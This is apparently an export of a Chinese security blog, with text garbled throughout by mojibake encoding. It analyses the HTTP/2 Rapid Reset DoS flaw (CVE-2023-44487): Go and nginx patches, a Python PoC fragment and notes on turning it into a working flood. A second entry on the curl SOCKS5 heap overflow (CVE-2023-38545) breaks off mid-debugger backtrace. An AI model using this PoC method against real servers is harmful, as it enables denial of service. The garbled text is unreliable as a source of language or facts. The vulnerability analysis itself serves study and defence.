1.1ä¸­ä½¿ç”¨å•ä¸ªTCPè¿æ¥é¡ºåºå‘é€è¯·æ±‚å’Œå“åº”ï¼Œåœ¨å‰é¢çš„è¯·æ±‚è¢«å“åº”ä¹‹åæ‰å¯ä»¥å‘é€åç»­çš„è¯·æ±‚ï¼Œä¸èƒ½è¢«å¤šè·¯å¤ç”¨ï¼Œæ­¤æ—¶å¦‚æœè¦å¯¹å…¶è¿›è¡ŒDOSçš„è¯éœ€è¦å¤§é‡æœºå™¨æ‰“å¼€TCPè¿æ¥é¡ºåºå‘é€è¯·æ±‚ï¼Œæ¶ˆè€—èµ„æºã€‚ HTTP 2 HTTP2ä¸­å®ç°äº†å¤šè·¯å¤ç”¨å’Œå¹¶å‘ï¼Œå¯ä»¥å¼‚æ­¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šè¿‡æµIDæ¥è¯†åˆ«æ•°æ®å±äºå“ªä¸€ä¸ªè¯·æ±‚ï¼Œè¿™å’ŒHTTP1.1 ç›¸æ¯”ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯ç”¨å¤§é‡å¹¶è¡Œè¯·æ±‚ï¼Œé€ æˆæœåŠ¡å™¨è´Ÿè½½ä¸Šå‡ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æŠ¤è¿™ç§æƒ…å†µï¼Œåœ¨HTTP2åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒSETTINGS_MAX_CONCURRENT_STREAMSå…è®¸æœåŠ¡å™¨å‘å®¢æˆ·ç«¯é€šå‘Šæœ€å¤§å…è®¸çš„å¹¶å‘æµï¼Œè¶…è¿‡è¿™ä¸ªé™åˆ¶çš„æµï¼ŒæœåŠ¡å™¨ä¼šè¿”å›RST_STREAMæ¥æ‹’ç»è¿™ä¸ªæµã€‚HTTP2å„ä¸ªçŠ¶æ€å¯ä»¥ä½¿ç”¨çŠ¶æ€æœºè¡¨ç¤ºï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„HEADERSå¸§æ—¶ï¼Œä¼šå°†æµçŠ¶æ€ä»ç©ºé—²è½¬æ¢ä¸ºæ‰“å¼€ï¼Œè€Œåè½¬ä¸ºåŠå…³é—­çŠ¶æ€ï¼Œåªæœ‰æµå¤„äºæ‰“å¼€çŠ¶æ€æˆ–åŠå…³é—­çŠ¶æ€æ‰ä¼šè¢«è®¡å…¥æ‰“å¼€çš„æµæ•°é‡ã€‚ æ¥æº:\rhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nä¸Šé¢æåˆ°ï¼Œåªæœ‰æ‰“å¼€å’ŒåŠå…³é—­çš„æµæ‰ä¼šè®¡å…¥æµæ•°é‡ï¼Œå½±å“å¹¶å‘é™åˆ¶ï¼Œå½“å®¢æˆ·ç«¯å‘é€RST_STREAMæ—¶ï¼ŒæµçŠ¶æ€ä¼šä»åŠå…³é—­çŠ¶æ€è½¬å…¥å…³é—­çŠ¶æ€ï¼Œå³é‡Šæ”¾äº†ä¸€ä¸ªæµï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¯ä»¥ç«‹å³å‘èµ·ä¸€ä¸ªæ–°è¯·æ±‚å ç”¨é‡Šæ”¾çš„æµï¼Œè¿™å°±æ˜¯CVE-2023-44487çš„å…³é”®ã€‚æ¶æ„å®¢æˆ·ç«¯å¯ä»¥åœ¨æ‰“å¼€å¤§é‡æµä¹‹åç«‹å³å‘é€RST_STREAMå¸§ï¼Œè¿™æ ·åœ¨è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨æš‚æœªå‡†å¤‡å¥½å“åº”æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚çš„RST_STREAMå¸§éšæœºåˆ°è¾¾æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å–æ¶ˆè¿™ä¸ªæµå¹¶é‡Šæ”¾ä¸€ä¸ªå¹¶å‘æµã€‚\nå›¾ç‰‡æ¥æºï¼š\rhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nåœ¨æ ‡å‡†HTTP2 DDOSçš„æ—¶å€™ï¼Œæ¶æ„å®¢æˆ·ç«¯å¯ä»¥æ‰“å¼€æœåŠ¡å™¨å…è®¸çš„æœ€å¤§é™åˆ¶çš„æµæ•°é‡è€Œåå‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¾æ¬¡å“åº”ï¼Œå¾ªç¯è¿™ä¸ªè¿‡ç¨‹ï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ è€Œå˜ç§HTTP2 DDOSä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨CVE-2023-44487 ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ»¥ç”¨HTTP 2çš„å–æ¶ˆè¯·æ±‚ï¼Œå¿«é€Ÿé‡ç½®æ— é™æ•°é‡çš„æµï¼Œæ ¹æ®RFC æœåŠ¡å™¨æ”¶åˆ°RST_STREAMå¸§ä¹‹åä¸éœ€è¦è¿”å›æ•°æ®ï¼Œåœ¨ç°å®å®ç°æ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„HRADERSè¯·æ±‚ï¼Œåœ¨æ”¶åˆ°RST_STREAMä¹‹å‰ï¼Œéœ€è¦è§£æå®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºï¼Œåœ¨æ”¶åˆ°RST_STREAMä¹‹åéœ€è¦é‡Šæ”¾èµ„æºï¼Œæ‰€ä»¥åœ¨å®¢æˆ·ç«¯åªéœ€è¦ä»˜å‡ºå¸¦å®½çš„ä»£ä»·ä¸‹ï¼ŒæœåŠ¡å™¨ä¼šä»˜å‡ºæ¯”è¿™ä¸ªé«˜å¾—å¤šçš„ä»£ä»·ï¼Œå¯¼è‡´é«˜æ•ˆç‡çš„DDOSã€‚\nè¡¥ä¸åˆ†æ\nåœ¨goä¸­æ”¯æŒHTTP2åè®®çš„è§£æï¼Œæ‰€ä»¥goä¹Ÿå—è¿™ä¸ªæ¼æ´å½±å“ï¼Œä¸‹é¢æ˜¯goä¿®å¤æ¼æ´çš„è¡¥ä¸diff å¯¹æ¯”goä¿®å¤è¿™ä¸ªæ¼æ´çš„è¡¥ä¸ï¼Œä¸»è¦ä¿®å¤é€»è¾‘åœ¨http2#scheduleHandlerï¼Œå…¶ä¸­advMaxStreamsé»˜è®¤ä¸º250ï¼Œå½“åœ¨å¤„ç†çš„æµè¶…è¿‡äº†250ï¼Œåˆ™æ¯”è¾ƒæœªå¼€å§‹å¤„ç†çš„æµæ•°é‡æ˜¯å¦å¤§äº1000ï¼Œå¤§äºåˆ™æŠ¥é”™ã€‚ å¯ä»¥çœ‹å‡ºæ¥è¡¥ä¸ä¸»è¦æ˜¯é™åˆ¶äº†åŒæ—¶å¹¶å‘æµçš„æ•°é‡ã€‚è¯¥æ–¹æ³•åœ¨processHeadersä¸­è°ƒç”¨ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨åŸå…ˆé€»è¾‘ä¸­ï¼Œä¼šç›´æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè€Œåœ¨è¡¥ä¸ä¸­ä¼šåˆ¤æ–­å½“å‰æµçš„æ•°é‡ï¼Œåœ¨èŒƒå›´å†…æ‰ä¼šè°ƒç”¨ go sc.runHandler(rw, req, handler)å¤„ç†è¯·æ±‚\ntype unstartedHandler struct { streamID uint32 rw *responseWriter req *http.Request handler func(http.ResponseWriter, *http.Request) } // scheduleHandler starts a handler goroutine, // or schedules one to start as soon as an existing handler finishes. func (sc *serverConn) scheduleHandler(streamID uint32, rw *responseWriter, req *http.Request, handler func(http.ResponseWriter, *http.Request)) error { sc.serveG.check() maxHandlers := sc.advMaxStreams if sc.curHandlers \u0026lt; maxHandlers { sc.curHandlers++ go sc.runHandler(rw, req, handler) return nil } if len(sc.unstartedHandlers) \u0026gt; int(4*sc.advMaxStreams) { return sc.countError(\u0026#34;too_many_early_resets\u0026#34;, ConnectionError(ErrCodeEnhanceYourCalm)) } sc.unstartedHandlers = append(sc.unstartedHandlers, unstartedHandler{ streamID: streamID, rw: rw, req: req, handler: handler, }) return nil } func (sc *serverConn) handlerDone() { sc.serveG.check() sc.curHandlers-- i := 0 maxHandlers := sc.advMaxStreams for ; i \u0026lt; len(sc.unstartedHandlers); i++ { u := sc.unstartedHandlers[i] if sc.streams[u.streamID] == nil { // This stream was reset before its goroutine had a chance to start. continue } if sc.curHandlers \u0026gt;= maxHandlers { break } sc.curHandlers++ go sc.runHandler(u.rw, u.req, u.handler) sc.unstartedHandlers[i] = unstartedHandler{} // don\u0026#39;t retain references } sc.unstartedHandlers = sc.unstartedHandlers[i:] if len(sc.unstartedHandlers) == 0 { sc.unstartedHandlers = nil } } nginxé’ˆå¯¹è¿™ä¸ªæ¼æ´ä¹Ÿå‡ºäº†ä¸€ä»½\rå®˜æ–¹é€šå‘ŠæŒ‡å‡ºé»˜è®¤é…ç½®ä¸å—æ­¤æ¼æ´å½±å“ï¼Œå³ keepalive_requests 1000;http2_max_concurrent_streams 128;è¿™ä¸ªé…ç½®ä¹Ÿå¯ä»¥å¯¹åº”ä¸Šgoè¡¥ä¸ä¸­çš„250æœ€å¤§streamå’Œ1000ä¸ªé˜Ÿåˆ—ã€‚\nè™½ç„¶é»˜è®¤é…ç½®ä¸å—è¯¥æ¼æ´å½±å“ï¼Œä½†nginxä¹Ÿé’ˆå¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œcommitä¸º\r6ceef192e7af1c507826ac38a2d43f08bf265fb9ï¼Œåœ¨è¯¥commitä¸­ä¹Ÿæ˜¯ç»Ÿè®¡å¹¶é™åˆ¶äº†å¹¶å‘æµæ•°é‡ï¼Œè¶…è¿‡æŸä¸ªé˜ˆå€¼åˆ™è¿”å›é”™è¯¯ã€‚\nå¼€å‘PoC\nåœ¨GitHubçš„\rPoCç»è¿‡å®é™…æµ‹è¯•ï¼Œæ²¡æœ‰è¾¾åˆ°è°·æ­Œå’ŒCFæ‰€è¯´çš„åœ¨å‘HTTP2è¯·æ±‚ä¹‹åç«‹é©¬é‡ç½®ï¼Œä¹Ÿå°±æ˜¯æ— æ•ˆPoCã€‚æ ¹æ®ä»£ç é€»è¾‘ï¼Œåœ¨å‘é€HTTP2 headerä¹‹åPoCæ¥ç€å°è¯•æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼Œå¦‚æœæœåŠ¡ç«¯è¿”å›äº†StreamResetåˆ™æ‰“å°å·²æˆåŠŸå–æ¶ˆï¼Œå¦‚æœæ˜¯RequestReceivedåˆ™è°ƒç”¨conn.reset_streamï¼Œä½†å®é™…åˆ©ç”¨åº”è¯¥æ˜¯å‘é€HTTP2 headerä¹‹åç«‹é©¬å‘é€RST_Streamï¼Œè€Œåæ‰“å¼€ä¸€ä¸ªæ–°æµé‡å¤å¦‚ä¸Šè¿‡ç¨‹ã€‚ å®é™…æµ‹è¯•å‘ç°ï¼Œconn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)æ°¸è¿œä¸ä¼šè¢«è°ƒç”¨åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯¥PoCä¼šæ‰§è¡Œå®Œæ•´çš„HTTP2è¯·æ±‚ï¼Œå®Œäº‹ä¹‹åæœåŠ¡ç«¯è¿”å›RST_STREAMï¼Œæ‰“å°å·²å–æ¶ˆï¼Œè¿™æ˜æ˜¾æ˜¯é”™è¯¯çš„ã€‚\nstream_id = conn.get_next_available_stream_id() conn.send_headers( stream_id, [(\u0026#39;:method\u0026#39;, \u0026#39;GET\u0026#39;), (\u0026#39;:authority\u0026#39;, url), (\u0026#39;:path\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;:scheme\u0026#39;, \u0026#39;https\u0026#39;)], ) sock.sendall(conn.data_to_send()) # Read some data while True: data = sock.recv(65535) if not data: break events = conn.receive_data(data) for event in events: if isinstance(event, RequestReceived): # Cancel the stream with error code for CANCEL conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL) elif isinstance(event, StreamReset): print(f\u0026#34;Stream {event.stream_id} cancelled.\u0026#34;) æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†æ¥æ”¶æ•°æ®çš„é€»è¾‘å»æ‰ï¼Œæ”¹ä¸ºå‘é€headersä¹‹åç›´æ¥å‘é€resetå³å¯ï¼ŒPoCæ™šäº›æ—¶å€™ä¼šä¸Šä¼ åˆ°\rGitHubä¸Šã€‚ åˆ©ç”¨æ•ˆæœå¦‚ä¸‹ï¼Œå•ä¸ªè¿›ç¨‹å•ä¸ªçº¿ç¨‹å¯ä»¥ä½¿æœåŠ¡CPUå ç”¨20%\nå½“ç„¶è¿™ä¸ªæ¼æ´PoCä¹Ÿé€‚åˆä½¿ç”¨goå†™ï¼Œæˆ‘è¿™è¾¹goå†™çš„å¹¶å‘æœ‰ç‚¹é—®é¢˜ï¼Œä¸å¦‚pythonç‰ˆæœ¬ç¨³å®šã€‚\næŠ“åŒ…åˆ†æ\nè¿è¡ŒPoCæŠ“åŒ…ï¼Œè§£å¯†ï¼Œwiresharkæ‘˜è¦å¦‚ä¸‹ï¼š\nåœ¨æœ¬æ¬¡ç¯å¢ƒä¸­ï¼ŒæœåŠ¡å™¨é€šå‘Šçš„æœ€å¤§å¹¶å‘æµä¸º250ã€‚åœ¨ä¸‹é¢çš„æ•°æ®åŒ…ä¸­ï¼Œå®¢æˆ·ç«¯å…ˆå‘é€HEADERSè¯·æ±‚ï¼Œè€Œåå‘é€RST_STREAMè¯·æ±‚ï¼Œå¾ªç¯å¾€å¤ã€‚\né€šè¿‡è¿™ç§åŠæ³•å®¢æˆ·ç«¯ä¸ç”¨ç­‰å¾…æœåŠ¡å™¨å“åº”ï¼Œå‘é€é€Ÿç‡åªå—è‡ªå·±å¸¦å®½é™åˆ¶ï¼Œä»è€Œå¹¶éæœåŠ¡å™¨åœ¨HTTP2åè®®åˆå§‹åŒ–æ—¶å£°æ˜çš„æœ€å¤§å¹¶å‘æµé™åˆ¶ã€‚\nå°ç»“ HTTP2 DOSåŸç†è¾ƒä¸ºç®€å•ï¼Œåˆ©ç”¨RFCæ‰€è§„å®šçš„åè®®ç‰¹æ€§ï¼Œæœ¬è´¨ä¸Šå±äºæ»¥ç”¨ï¼Œè€ŒCloudFlareå¯¹æ­¤çš„åº”å¯¹ç­–ç•¥æ˜¯å½“å®¢æˆ·ç«¯é‡ç½®æ¬¡æ•°è¶…è¿‡æŸä¸ªé˜ˆå€¼åˆ™è®¤ä¸ºæ˜¯æ¶æ„å®¢æˆ·ç«¯ï¼Œå…³é—­è¯¥è¿æ¥ã€‚\nç”±äºnginxé»˜è®¤é…ç½®ä¸å—å½±å“ï¼Œæ‰€ä»¥å—æ­¤æ¼æ´å½±å“çš„å¤§éƒ¨åˆ†æ˜¯go æˆ–è€…javaå¯åŠ¨çš„HTTPæœåŠ¡ï¼ŒåŒæ—¶å¦‚æœä½¿ç”¨nginxåä»£åç«¯æœåŠ¡ï¼Œå³ä½¿åç«¯æœåŠ¡æ”¯æŒHTTP2ï¼Œnginxä¹Ÿä¼šå°†è¯·æ±‚é™çº§åˆ°HTTP 1.1ã€‚\nå¯é¢„è§çš„å°†æ¥ï¼Œæ­¤æ¬¡è¿™ç§æ¼æ´çš„å‡ºç°ä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ï¼Œhope the internet will become more and more secure.\nå‚è€ƒé“¾æ¥\nhttps://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers\nhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nhttps://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/\nCreated at 2023-10-13T15:11:25+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/","title":"CVE-2023-38545 Curl å †æº¢å‡ºæ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨libcurlä¸­å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œå½“libcurlé€šè¿‡socks5ä»£ç†å‘é€è¯·æ±‚æ—¶ï¼Œå¦‚æœhostnameå¤§äº255åˆ™ä¼šåœ¨æœ¬åœ°è§£æï¼Œä½†ç”±äºçŠ¶æ€æœºé”™è¯¯å¯¼è‡´æ²¡æœ‰æŒ‰ç…§é¢„æœŸè§£æï¼Œè€Œæ˜¯æŠŠä¸»æœºåæ‹·è´åˆ°ç¼“å†²åŒºä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ è¶…é•¿ä¸»æœºåè§¦å‘å †æº¢å‡ºã€‚\nå½±å“ç‰ˆæœ¬ 7.69.0 \u0026lt;= libcurl \u0026lt;= 8.3.4\nç¯å¢ƒæ­å»º sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸ æ¼æ´åœ¨\rfb4415d8aee6c1045be932a34fe6107c2f5ed147ä¿®å¤ï¼Œä¿®å¤ä»£ç å¦‚ä¸‹ ä»ä¿®å¤ä»£ç ä¸­å¯ä»¥çœ‹å‡ºä¸¤ä¸ªåŒºåˆ«\nå½“socks5_resolve_local=false and hostname_len \u0026gt;255 æ—¶è¿”å›CURLPX_LONG_HOSTNAMEé”™è¯¯ç ï¼Œè€ŒåŸå…ˆé€»è¾‘ä¸ºå°†socks5_resolve_localè®¾ä¸ºtrue å°†hostname_lenè½¬ä¸ºunsigned charåèµ‹å€¼ç»™socksreq[len++] ä¿®å¤ä»£ç ä½äºdo_SOCKS5å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”±connect_SOCKSå‡½æ•°è°ƒç”¨ static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-\u0026gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; å‘ä¸Šè¿½æº¯connect_SOCKSç”±socks_proxy_cf_connectè°ƒç”¨ï¼Œsocks_proxy_cf_connectè¢«å­˜å‚¨åœ¨äº†ä¸€ä¸ªç»“æ„ä½“ä¸­\nstatic CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-\u0026gt;conn; int sockindex = cf-\u0026gt;sockindex; struct socks_state *sx = cf-\u0026gt;ctx; if(cf-\u0026gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-\u0026gt;next-\u0026gt;cft-\u0026gt;do_connect(cf-\u0026gt;next, data, blocking, done); if(result || !*done) return result; if(!sx) { sx = calloc(sizeof(*sx), 1); if(!sx) return CURLE_OUT_OF_MEMORY; cf-\u0026gt;ctx = sx; } if(sx-\u0026gt;state == CONNECT_INIT) { /* for the secondary socket (FTP), use the \u0026#34;connect to host\u0026#34; * but ignore the \u0026#34;connect to port\u0026#34; (use the secondary port) */ sxstate(sx, data, CONNECT_SOCKS_INIT); sx-\u0026gt;hostname = conn-\u0026gt;bits.httpproxy ? conn-\u0026gt;http_proxy.host.name : conn-\u0026gt;bits.conn_to_host ? conn-\u0026gt;conn_to_host.name : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondaryhostname : conn-\u0026gt;host.name; sx-\u0026gt;remote_port = conn-\u0026gt;bits.httpproxy ? (int)conn-\u0026gt;http_proxy.port : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondary_port : conn-\u0026gt;bits.conn_to_port ? conn-\u0026gt;conn_to_port : conn-\u0026gt;remote_port; sx-\u0026gt;proxy_user = conn-\u0026gt;socks_proxy.user; sx-\u0026gt;proxy_password = conn-\u0026gt;socks_proxy.passwd; } result = connect_SOCKS(cf, sx, data); struct Curl_cftype Curl_cft_socks_proxy = { \u0026#34;SOCKS-PROXYY\u0026#34;, CF_TYPE_IP_CONNECT, 0, socks_proxy_cf_destroy, socks_proxy_cf_connect, socks_proxy_cf_close, socks_cf_get_host, socks_cf_get_select_socks, Curl_cf_def_data_pending, Curl_cf_def_send, Curl_cf_def_recv, Curl_cf_def_cntrl, Curl_cf_def_conn_is_alive, Curl_cf_def_conn_keep_alive, Curl_cf_def_query, }; æŠ€æœ¯åˆ†æå’ŒåŠ¨æ€è°ƒè¯• æœ¬æ¬¡ä¿®å¤çš„å‡½æ•°do_SOCKS5å®ç°äº†å¤„ç†SOCKS5è¿æ¥ä¸­çš„å„ä¸ªçŠ¶æ€çš„ä»£ç ï¼Œè¿™ä¸ªå‡½æ•°å®ç°äº†ä¸€ä¸ªçŠ¶æ€æœºï¼ŒçŠ¶æ€æœºæ ¹æ®åœ¨socksè¿æ¥ä¸­çš„ä¸åŒçŠ¶æ€è¿›è¡Œä¸åŒæ“ä½œï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨do_SOCKS5æ—¶ï¼Œsocks5_resolve_localè¢«åˆå§‹åŒ–ä¸º falseï¼ŒåŒæ—¶çŠ¶æ€æœºçŠ¶æ€ä¸ºCONNECT_SOCKS_INIT\nbool socks5_resolve_local = (conn-\u0026gt;socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE; gefâ¤ p socks5_resolve_local $5 = 0x0 å‡½æ•°è¿›å…¥CONNECT_SOCKS_INITåˆ†æ”¯ï¼Œç”±äºä¼ é€’ç»™curlçš„ä¸»æœºåè¶…é•¿ï¼Œå¤§äº255ï¼Œè¿›å…¥ifä¸­ï¼Œsocks5_resolve_localè¢«èµ‹å€¼ä¸ºtrueï¼Œä»£è¡¨æ­¤æ—¶åº”è¯¥ä½¿ç”¨æœ¬åœ°è§£æ\nswitch(sx-\u0026gt;state) { case CONNECT_SOCKS_INIT: if(conn-\u0026gt;bits.httpproxy) infof(data, \u0026#34;SOCKS5: connecting to HTTP proxy %s port %d\u0026#34;, sx-\u0026gt;hostname, sx-\u0026gt;remote_port); /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */ if(!socks5_resolve_local \u0026amp;\u0026amp; hostname_len \u0026gt; 255) { infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); socks5_resolve_local = TRUE; } æ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ source:socks.c+595 â”€â”€â”€â”€ 590 infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; 591 \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); 592 socks5_resolve_local = TRUE; 593 } 594 // auth=0x5 â†’ 595 if(auth \u0026amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI)) 596 infof(data, 597 \u0026#34;warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u\u0026#34;, 598 auth); 599 if(!(auth \u0026amp; CURLAUTH_BASIC)) 600 /* disable username/password auth */ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€ [#0] Id 1, Name: \u0026#34;curl\u0026#34;, stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€ gefâ¤ p socks5_resolve_local $6 = 0x1 gefâ¤ bt #0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573 #1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #10 0x00007ffff7eeb40c in 